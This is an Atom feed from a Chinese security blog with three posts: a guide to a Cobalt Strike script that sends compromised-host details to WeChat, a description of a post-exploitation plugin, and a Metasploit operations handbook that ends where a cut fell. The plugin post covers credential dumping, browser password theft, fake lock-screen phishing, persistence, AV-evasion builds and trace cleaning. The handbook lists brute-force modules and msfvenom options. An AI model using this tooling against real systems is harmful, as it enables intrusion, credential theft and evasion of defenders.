<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>离沫凌天๓</title>
  
  
  <link href="https://www.lintstar.top/atom.xml" rel="self"/>
  
  <link href="https://www.lintstar.top/"/>
  <updated>2021-08-12T03:43:17.679Z</updated>
  <id>https://www.lintstar.top/</id>
  
  <author>
    <name>离沫凌天๓</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CS-ServerChan 主机上线微信通知</title>
    <link href="https://www.lintstar.top/2021/07/e65fcded.html"/>
    <id>https://www.lintstar.top/2021/07/e65fcded.html</id>
    <published>2021-07-28T03:49:59.000Z</published>
    <updated>2021-08-12T03:43:17.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CS-ServerChan"><a href="#CS-ServerChan" class="headerlink" title="CS-ServerChan"></a>CS-ServerChan</h1><p><strong>通过 CobaltStike 服务端 / 客户端 挂载脚本，将上线主机信息通过 Server 酱通知到微信</strong></p><p><strong>项目地址：<a href="https://github.com/lintstar/CS-ServerChan/releases">https://github.com/lintstar/CS-ServerChan/releases</a></strong></p><blockquote><p><strong>如果想使用免费且支持微信模板消息推送的方式可以移步：<a href="https://github.com/lintstar/CS-PushPlus">https://github.com/lintstar/CS-PushPlus</a></strong></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>使用旧的 CS Server酱通知脚本时看到了 ServerChan 关于旧版服务 API 下线的通知：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728110826.png" alt="Screenshot_20210728_110540_com.tencent.mm"></p><p><strong>那就更新下 sendkey 吧</strong></p><h1 id="配置相关信息"><a href="#配置相关信息" class="headerlink" title="配置相关信息"></a>配置相关信息</h1><p><strong>脚本有两个地方需要替换：</strong></p><h2 id="ServerChan-py"><a href="#ServerChan-py" class="headerlink" title="ServerChan.py"></a>ServerChan.py</h2><p><strong><a href="https://sct.ftqq.com/sendkey">https://sct.ftqq.com/sendkey</a>  复制自己的 KEY 替换到下面的地方</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728111654.png" alt="image-20210728111654791"></p><p>这里的通知模板支持 Markdown 格式可以随意替换</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728111816.png" alt="image-20210728111816041"></p><blockquote><p><strong>这里加 Token随机数的原因是Server 酱一分钟内无法发送重复信息</strong></p></blockquote><h2 id="ServerChan-cna"><a href="#ServerChan-cna" class="headerlink" title="ServerChan.cna"></a>ServerChan.cna</h2><p><strong>在客户端或者服务端后台挂载时，需要改成 <code>ServerChan.py</code> Python 脚本所在的绝对路径（从盘符开始）</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728111409.png" alt="image-20210728111409394"></p><p><strong>通过 CobaltStike 服务端 / 客户端 挂载脚本，将上线主机信息通过 Server 酱通知到微信</strong></p><h1 id="服务端后台挂载"><a href="#服务端后台挂载" class="headerlink" title="服务端后台挂载"></a>服务端后台挂载</h1><p><strong>把 cna 脚本添加到本地客户端后，如果beacon上线了，这个提醒的请求是从客户端发出的。</strong></p><p><strong>如果网络有波动，断开了到 teamserver 的连接，就收不到通知了。</strong></p><p><strong>解决方法是使用 agscript 在服务器端运行cna文件，和挂载 CobaltStrike 一样，把 cna 脚本也挂载到后台：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@Catherine CS4.3]<span class="comment"># screen</span></span><br><span class="line">[root@Catherine CS4.3]<span class="comment"># ./agscript xx.xxx.xx.xxx [port] Catherine [passwd] CS-ServerChan/ServerChan.cna</span></span><br><span class="line">Initial Beacon Checkin: 2122252342 PID: 3488</span><br><span class="line">Sending server: python3 /root/Tools/CS4.3/CS-SeverChan/ServerChan.py --computernam LINTSTAR82CF --internalip 10.xx.xx.15 --username lintstar</span><br></pre></td></tr></table></figure><p><strong>挂载后查看进程：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@Catherine ~]<span class="comment"># ps -a</span></span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">1045504 pts/0    00:00:00 teamserver</span><br><span class="line">1045507 pts/0    00:00:12 java</span><br><span class="line">1049085 pts/4    00:00:00 bash</span><br><span class="line">1049086 pts/4    00:00:08 java</span><br><span class="line">1055932 pts/7    00:00:00 ps</span><br></pre></td></tr></table></figure><h2 id="Agscript-用法"><a href="#Agscript-用法" class="headerlink" title="Agscript 用法"></a>Agscript 用法</h2><p><strong>这里 agscript 的用法为：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agscript [host] [port] [user] [pass] &lt;/path/to/file.cna&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>[host] # 服务器的 ip 地址。</strong></li><li><strong>[port] # cs 的端口号，启动 cs 时有显示。</strong></li><li><strong>[user] # 后台挂载脚本时连接到 teamserver 的用户名。</strong></li><li><strong>[pass] # 启动服务端 cs 时设置的密码。</strong></li><li><strong>[path] # cna 文件的路径。</strong></li></ul><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><h2 id="企业微信服务号通知"><a href="#企业微信服务号通知" class="headerlink" title="企业微信服务号通知"></a>企业微信服务号通知</h2><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728112709.png" alt="Screenshot_20210728_103739_com.tencent.mm"></p><h2 id="通知详情"><a href="#通知详情" class="headerlink" title="通知详情"></a>通知详情</h2><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728112550.png" alt="Screenshot_20210728_103809_com.tencent.mm"></p><h1 id="企业微信应用消息配置说明"><a href="#企业微信应用消息配置说明" class="headerlink" title="企业微信应用消息配置说明"></a>企业微信应用消息配置说明</h1><blockquote><p><strong>来源：<a href="https://sct.ftqq.com/forward">https://sct.ftqq.com/forward</a></strong></p></blockquote><p><strong>优点：</strong></p><ol><li><strong>一次配置，持续使用</strong></li><li><strong>配置好以后，只需要微信就能收消息，不再需要安装企业微信客户端</strong></li></ol><p><strong>PS：消息接口无需认证即可使用，个人用微信就可以注册</strong></p><h2 id="0x01-注册企业"><a href="#0x01-注册企业" class="headerlink" title="0x01 注册企业"></a>0x01 注册企业</h2><p>用电脑打开<a href="https://work.weixin.qq.com/">企业微信官网</a>，注册一个企业</p><h2 id="0x02-创建应用"><a href="#0x02-创建应用" class="headerlink" title="0x02 创建应用"></a>0x02 创建应用</h2><p>注册成功后，点「管理企业」进入管理界面，选择「应用管理」 → 「自建」 → 「创建应用」</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728113134.png" alt="img"></p><p>应用名称填入「Server酱」，应用logo到<a href="https://theseven.ftqq.com/20210208142819.png">这里</a>下载，可见范围选择公司名。</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728113157.png" alt="img"></p><p>创建完成后进入应用详情页，可以得到应用ID( <code>agentid</code> )①，应用Secret( <code>secret</code> )②。</p><p>注意：<code>secret</code>推送到手机端时，只能在<code>企业微信客户端</code>中查看。</p><p><a href="https://camo.githubusercontent.com/ec3ddd2dd460680f9fc61acc8a1bd215fcb947608102764539c4ce43bc1e0f26/68747470733a2f2f746865736576656e2e667471712e636f6d2f32303231303230383134333535332e706e67"><img src= "/img/loading.gif" data-lazy-src="https://camo.githubusercontent.com/ec3ddd2dd460680f9fc61acc8a1bd215fcb947608102764539c4ce43bc1e0f26/68747470733a2f2f746865736576656e2e667471712e636f6d2f32303231303230383134333535332e706e67" alt="img"></a></p><h2 id="0x03-获取企业ID"><a href="#0x03-获取企业ID" class="headerlink" title="0x03 获取企业ID"></a>0x03 获取企业ID</h2><p>进入「<a href="https://work.weixin.qq.com/wework_admin/frame#profile">我的企业</a>」页面，拉到最下边，可以看到企业ID③，复制并填到上方。</p><p>推送UID直接填 <code>@all</code> ，推送给公司全员。</p><h2 id="0x04-推送消息到微信"><a href="#0x04-推送消息到微信" class="headerlink" title="0x04 推送消息到微信"></a>0x04 推送消息到微信</h2><p>进入「我的企业」 → 「<a href="https://work.weixin.qq.com/wework_admin/frame#profile/wxPlugin">微信插件</a>」，拉到下边扫描二维码，关注以后即可收到推送的消息。</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728113233.png" alt="img"></p><p>PS：如果出现<code>接口请求正常，企业微信接受消息正常，个人微信无法收到消息</code>的情况：</p><ol><li><p>进入「我的企业」 → 「<a href="https://work.weixin.qq.com/wework_admin/frame#profile/wxPlugin">微信插件</a>」，拉到最下方，勾选 “允许成员在微信插件中接收和回复聊天消息”</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728113255.jpeg" alt="img"></p></li><li><p>在企业微信客户端 「我」 → 「设置」 → 「新消息通知」中关闭 “仅在企业微信中接受消息” 限制条件</p><p> <img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210728113358.jpeg" alt="img"></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CS-ServerChan&quot;&gt;&lt;a href=&quot;#CS-ServerChan&quot; class=&quot;headerlink&quot; title=&quot;CS-ServerChan&quot;&gt;&lt;/a&gt;CS-ServerChan&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;通过 CobaltStike 服务端</summary>
      
    
    
    
    <category term="Tools" scheme="https://www.lintstar.top/categories/Tools/"/>
    
    
    <category term="CobaltStrike" scheme="https://www.lintstar.top/tags/CobaltStrike/"/>
    
    <category term="ServerChan" scheme="https://www.lintstar.top/tags/ServerChan/"/>
    
    <category term="Aggressor" scheme="https://www.lintstar.top/tags/Aggressor/"/>
    
  </entry>
  
  <entry>
    <title>LSTAR - CobaltStrike 后渗透插件</title>
    <link href="https://www.lintstar.top/2021/07/d1676e54.html"/>
    <id>https://www.lintstar.top/2021/07/d1676e54.html</id>
    <published>2021-07-07T05:49:59.000Z</published>
    <updated>2021-08-15T08:51:54.252Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LSTAR-Aggressor"><a href="#LSTAR-Aggressor" class="headerlink" title="LSTAR - Aggressor"></a>LSTAR - Aggressor</h1><p><strong>本着简化 CS 右键和方便自己集成的目的，对 Reference 里的项目进行了缝合以及二次开 (抄) 发 (袭)</strong> </p><p><strong>并添加了虚拟机/AV 检测、主机相关密码抓取、 Cxk 限时免杀的 mimikatz 和 adduser 等功能</strong></p><blockquote><p><strong>项目链接：<a href="https://github.com/lintstar/LSTAR">https://github.com/lintstar/LSTAR</a></strong></p></blockquote><p><strong>项目树较为简单直观 且方便 DIY：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210812113750.png" alt="image-20210812113750414"></p><blockquote><p><strong>CobaltStrike 主机上线微信通知插件：</strong></p><p><strong>如果想使用免费且支持微信模板消息推送的方式可以移步：<a href="https://github.com/lintstar/CS-PushPlus">https://github.com/lintstar/CS-PushPlus</a></strong></p><p><strong>如果有订阅 ServerChan 的企业微信推送通道可以移步：<a href="https://github.com/lintstar/CS-ServerChan">https://github.com/lintstar/CS-ServerChan</a></strong></p></blockquote><h1 id="2021-08-12更新"><a href="#2021-08-12更新" class="headerlink" title="2021.08.12更新"></a>2021.08.12更新</h1><h2 id="InfoCollect"><a href="#InfoCollect" class="headerlink" title="InfoCollect"></a>InfoCollect</h2><p>新增 CheckVM 检测目标是否为虚拟机</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210808221427.png" alt="20210808_2213"></p><h2 id="AVSearch"><a href="#AVSearch" class="headerlink" title="AVSearch"></a>AVSearch</h2><p>由于之前的脚本有一定概率失败：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811110517.png" alt="image-20210808222325403"></p><p>更新了新的检测杀软方式</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210808221945.png" alt="image-20210808221945724"></p><h2 id="AuthPromote"><a href="#AuthPromote" class="headerlink" title="AuthPromote"></a>AuthPromote</h2><p><strong>修复了之前提权模块的 BUG</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811105401.png" alt="image-20210811105401723"></p><h2 id="AuthMaintain"><a href="#AuthMaintain" class="headerlink" title="AuthMaintain"></a>AuthMaintain</h2><p><strong>EasyPersistent：</strong><a href="https://github.com/yanghaoi/CobaltStrike_CNA/tree/main/EasyCNA">https://github.com/yanghaoi/CobaltStrike_CNA/tree/main/EasyCNA</a></p><p><strong>新增一个用于 Windows 系统上权限维持的 Cobalt Strike CNA 脚本</strong></p><p><strong>使用反射 DLL 模块通过 API 对系统服务、计划任务等常见权限维持方法进行可视化操作，非 常 好 用。（作者原话）</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210812170907.png" alt="image-20210812170907609"></p><blockquote><p><strong>说明文档：</strong><a href="https://github.com/yanghaoi/CobaltStrike_CNA/blob/main/EasyCNA/README.md">https://github.com/yanghaoi/CobaltStrike_CNA/blob/main/EasyCNA/README.md</a></p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210812170946.png" alt="image-20210812170946202"></p><h2 id="PassCapture"><a href="#PassCapture" class="headerlink" title="PassCapture"></a>PassCapture</h2><h3 id="Mimikatz-相关"><a href="#Mimikatz-相关" class="headerlink" title="Mimikatz 相关"></a>Mimikatz 相关</h3><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811104834.png" alt="image-20210811104834675"></p><h3 id="Lazagne"><a href="#Lazagne" class="headerlink" title="Lazagne"></a>Lazagne</h3><p><strong>实战测试比较好用的检索主机密码工具 （上传运行后会自动删除 exe 文件）</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811102145.png" alt="image-20210811102145547"></p><h3 id="浏览器密码"><a href="#浏览器密码" class="headerlink" title="浏览器密码"></a>浏览器密码</h3><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811105159.png" alt="image-20210811105159479"></p><p><strong>推荐使用 HackBrowserData 几乎涵盖所有类型的浏览器：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210812124004.png" alt="image-20210812124004797"></p><h3 id="Navicat-Xshell-等本机软件"><a href="#Navicat-Xshell-等本机软件" class="headerlink" title="Navicat Xshell 等本机软件"></a>Navicat Xshell 等本机软件</h3><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811105105.png" alt="image-20210811105105056"></p><h3 id="FakeTheScreen"><a href="#FakeTheScreen" class="headerlink" title="FakeTheScreen"></a>FakeTheScreen</h3><p><strong>优化了针对 Windows10和 Windows7不同的钓鱼密码窃取</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811095234.png" alt="image-20210811095234252"></p><p><strong>由于伪造页面效果一言难尽，只建议在准备鱼死网破时使用：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811094621.png" alt="image-20210811094621414"></p><h2 id="AboutMe"><a href="#AboutMe" class="headerlink" title="AboutMe"></a>AboutMe</h2><p><strong>添加了 AboutMe 帮助菜单</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811105716.png" alt="image-20210811105716461"></p><p><strong>方便从 CS 跳转 凌星阁</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210811110156.png" alt="image-20210811110156391"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://github.com/pandasec888/taowu-cobalt-strike"><strong>梼杌 - taowu-cobalt-strike</strong></a></p><p><a href="https://github.com/z1un/Z1-AggressorScripts"><strong>Z1-AggressorScripts</strong></a></p><p><a href="https://github.com/422926799/csplugin"><strong>九世自开 csplugin</strong></a></p><p><a href="https://github.com/yanghaoi/CobaltStrike_CNA/blob/main/EasyCNA/README.md">EasyPersistent Windows 权限维持</a></p><h1 id="InfoCollect-1"><a href="#InfoCollect-1" class="headerlink" title="InfoCollect"></a>InfoCollect</h1><p><strong>添加了 Netview 和 Powerview 功能</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151205.png" alt="image-20210707112534352"></p><h1 id="AvSearch"><a href="#AvSearch" class="headerlink" title="AvSearch"></a>AvSearch</h1><p><strong>通过 Wmic 进行进程查询</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151216.png" alt="image-20210707114047098"></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151223.png" alt="image-20210706105117525"></p><h1 id="IntrScan"><a href="#IntrScan" class="headerlink" title="IntrScan"></a>IntrScan</h1><p><strong>包含各类内网大保健</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151250.png" alt="image-20210707112718120"></p><p><strong>自定义指令运行</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151356.png" alt="image-20210706110153336"></p><p><strong>fscan 默认上传至 <code>C:\\Users\\Public\\</code></strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151303.png" alt="image-20210706110110475"></p><p><strong>控制台返回</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151402.png" alt="image-20210706110008931"></p><p><strong>删除 fscan 及结果文本</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151415.png" alt="image-20210706110809988"></p><h1 id="IntrAgent"><a href="#IntrAgent" class="headerlink" title="IntrAgent"></a>IntrAgent</h1><p><strong>比较好用的内网穿透工具 且均无配置文件落地 降低被溯源风险</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151422.png" alt="image-20210707112750687"></p><h1 id="AuthPromote-1"><a href="#AuthPromote-1" class="headerlink" title="AuthPromote"></a>AuthPromote</h1><p><strong>只缝合了梼杌的提权 EXP 后续待完善</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151429.png" alt="image-20210707112813847"></p><h1 id="AuthMaintain-1"><a href="#AuthMaintain-1" class="headerlink" title="AuthMaintain"></a>AuthMaintain</h1><p><strong>在梼杌的基础上 添加了白银票据和黄金票据</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151438.png" alt="image-20210707112856320"></p><h1 id="PassCapture-1"><a href="#PassCapture-1" class="headerlink" title="PassCapture"></a>PassCapture</h1><p><strong>各类密码抓取</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151447.png" alt="image-20210707113614496"></p><h1 id="LateMovement"><a href="#LateMovement" class="headerlink" title="LateMovement"></a>LateMovement</h1><p><strong>包含 基于135端口的sharpwmi 等横向移动套件</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151454.png" alt="image-20210707113642982"></p><h1 id="TraceClean"><a href="#TraceClean" class="headerlink" title="TraceClean"></a>TraceClean</h1><p><strong>缝合九世的痕迹清理 待完善</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151501.png" alt="image-20210707113717904"></p><h1 id="BypassCxk"><a href="#BypassCxk" class="headerlink" title="BypassCxk"></a>BypassCxk</h1><p><strong>cxk 限时免杀版 adduser 和 mimikatz</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151508.png" alt="image-20210707113737475"></p><h1 id="HavingFun"><a href="#HavingFun" class="headerlink" title="HavingFun"></a>HavingFun</h1><p><strong>搞站的日子里图一乐</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210707151515.png" alt="image-20210707113749756"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LSTAR-Aggressor&quot;&gt;&lt;a href=&quot;#LSTAR-Aggressor&quot; class=&quot;headerlink&quot; title=&quot;LSTAR - Aggressor&quot;&gt;&lt;/a&gt;LSTAR - Aggressor&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;本着简化 C</summary>
      
    
    
    
    <category term="Tools" scheme="https://www.lintstar.top/categories/Tools/"/>
    
    
    <category term="CobaltStrike" scheme="https://www.lintstar.top/tags/CobaltStrike/"/>
    
    <category term="Attack" scheme="https://www.lintstar.top/tags/Attack/"/>
    
    <category term="Aggressor" scheme="https://www.lintstar.top/tags/Aggressor/"/>
    
  </entry>
  
  <entry>
    <title>MSF 作战手册及联动 CobaltStrike</title>
    <link href="https://www.lintstar.top/2021/06/cc6d559a.html"/>
    <id>https://www.lintstar.top/2021/06/cc6d559a.html</id>
    <published>2021-06-12T15:49:59.000Z</published>
    <updated>2021-07-13T01:06:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MSF-作战手册及联动-CobaltStrike"><a href="#MSF-作战手册及联动-CobaltStrike" class="headerlink" title="MSF 作战手册及联动 CobaltStrike"></a>MSF 作战手册及联动 CobaltStrike</h1><p>一直一来由于比较喜欢 CS 的多人协同、插件和图形化界面，MSF 的研究相对较少，而 MSF 的模块以及漏洞利用方面的支持是优于CS 的，某些内网探测模块一直都很好用，而且控制的好，动静也并不会非常大。因此今天来探究下 Metasploit 后渗透框架以及和 CobaltStrike 的联动。</p><h1 id="MSF-模块划分"><a href="#MSF-模块划分" class="headerlink" title="MSF 模块划分"></a>MSF 模块划分</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210704115641.png" alt="image-20210704115641312"></p><ul><li>2146 个渗透攻击模块 (Exploits) - 选择并植入载荷获取权限</li><li>1142 个辅助模块 (Auxiliary) - 扫描主机系统，寻找可用漏洞</li><li>365 个后渗透攻击模块 (Post) - 用于内网渗透的各种操作</li><li>592 个攻击载荷 (Payloads) - 渗透攻击成功后植入代码控制目标系统会话连接</li><li>45 个编码器模块 (Encoders) - 选择编码技术，确保攻击载荷不会出现 “坏字符”</li><li>10 个空指令模块 (Nops) - 在执行 shellcode 前加入一些空指令，避免攻击载荷在执行过程中出现随机地址或返回地址错误</li><li>7 个免杀模块 (Evasion) - 对攻击载荷进行 “免杀”</li></ul><h1 id="Msfconsole-参数摘要"><a href="#Msfconsole-参数摘要" class="headerlink" title="Msfconsole 参数摘要"></a>Msfconsole 参数摘要</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">reload_all<span class="comment">#从目录重载所有模块</span></span><br><span class="line">back<span class="comment">#后退命令，移出当前上下文，用于模块切换</span></span><br><span class="line">info<span class="comment">#目标和模块详细信息</span></span><br><span class="line">check<span class="comment">#检查目标是否受某个漏洞影响</span></span><br><span class="line"></span><br><span class="line">background  <span class="comment">#切到后台</span></span><br><span class="line">sessions<span class="comment">#会话管理</span></span><br><span class="line">sessions -l<span class="comment">#列出所有会话</span></span><br><span class="line">sessions -K<span class="comment">#终止所有会话</span></span><br><span class="line">sessions -i id<span class="comment">#进入某个会话</span></span><br><span class="line">sessions -v<span class="comment">#以详细模式列出会话</span></span><br><span class="line">sessions -u<span class="comment">#在许多平台上将shell升级到meterpreter会话</span></span><br><span class="line"></span><br><span class="line">show options<span class="comment">#显示可选选项</span></span><br><span class="line"> auxiliary<span class="comment">#显示所有辅助模块</span></span><br><span class="line"> exploits<span class="comment">#显示所有漏洞利用模块</span></span><br><span class="line"> payloads<span class="comment">#显示所有有效载荷</span></span><br><span class="line"> targets<span class="comment">#显示所有可用目标</span></span><br><span class="line"> advanced<span class="comment">#显示更多高级选项</span></span><br><span class="line"> encoders<span class="comment">#显示可用编码器列表</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> proxies sock5:127.0.0.1:8000 <span class="comment">#设置代理</span></span><br></pre></td></tr></table></figure><h1 id="辅助模块（Auxiliary）"><a href="#辅助模块（Auxiliary）" class="headerlink" title="辅助模块（Auxiliary）"></a>辅助模块（Auxiliary）</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portmap/portmap_amp</span><br><span class="line">use auxiliary/scanner/portscan/ftpbounce</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">use auxiliary/scanner/portscan/ack</span><br><span class="line">use auxiliary/scanner/portscan/syn</span><br><span class="line">use auxiliary/scanner/portscan/xmas</span><br></pre></td></tr></table></figure><h2 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_login<span class="comment">#SSH爆破</span></span><br><span class="line">auxiliary/scanner/vnc/vnc_none_auth<span class="comment">#VNC空口令扫描</span></span><br><span class="line">auxiliary/scanner/telnet/telnet_login  <span class="comment">#Telnet爆破</span></span><br><span class="line">auxiliary/scanner/smb/smb_version<span class="comment">#SMB系统版本扫描</span></span><br><span class="line">auxiliary/scanner/smb/smb_enumusers<span class="comment">#SMB枚举</span></span><br><span class="line">auxiliary/scanner/smb/smb_login<span class="comment">#SMB弱口令登录</span></span><br><span class="line">auxiliary/admin/smb/psexec_command<span class="comment">#登录SMB且执行命令</span></span><br><span class="line"></span><br><span class="line">auxiliary/scanner/redis/redis_login<span class="comment">#Redis爆破</span></span><br><span class="line">auxiliary/scanner/mssql/mssql_ping<span class="comment">#MSSQL主机信息扫描</span></span><br><span class="line">auxiliary/admin/mssql/mssql_enum<span class="comment">#MSSQL枚举</span></span><br><span class="line">auxiliary/scanner/mysql/mysql_login<span class="comment">#MySQL弱口令扫描</span></span><br><span class="line">auxiliary/admin/mysql/mysql_enum<span class="comment">#MySQL枚举</span></span><br></pre></td></tr></table></figure><h1 id="Msfenvom-生成被控端"><a href="#Msfenvom-生成被控端" class="headerlink" title="Msfenvom 生成被控端"></a>Msfenvom 生成被控端</h1><p><strong>使用说明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line"></span><br><span class="line">-p, --payload &lt;payload&gt; 使用指定的payload</span><br><span class="line">--payload-options 列出该payload参数</span><br><span class="line">-l, --list [type] 列出所有的payloads</span><br><span class="line">-n, --nopsled &lt;length&gt; 为payload指定一个 nopsled 长度</span><br><span class="line">-f, --format &lt;format&gt; 指定payload生成格式</span><br><span class="line">--help-formats 查看所有支持格式</span><br><span class="line">-e, --encoder &lt;encoder&gt; 使用编码器</span><br><span class="line">-a, --arch &lt;arch&gt; 指定payload构架</span><br><span class="line">--platform &lt;platform&gt; 指定payload平台</span><br><span class="line">--help-platforms 显示支持的平台</span><br><span class="line">-s, --space &lt;length&gt; 设定payload攻击荷载的最大长度</span><br><span class="line">--encoder-space &lt;length&gt; The maximum size of the encoded payload</span><br><span class="line"></span><br><span class="line">(defaults to the -s value)</span><br><span class="line">-b, --bad-chars &lt;list&gt; 指定bad-chars 如: &#39;\x00\xff&#39;</span><br><span class="line">-i, --iterations &lt;count&gt; 指定编码次数</span><br><span class="line">-c, --add-code &lt;path&gt; 指定个win32 shellcode 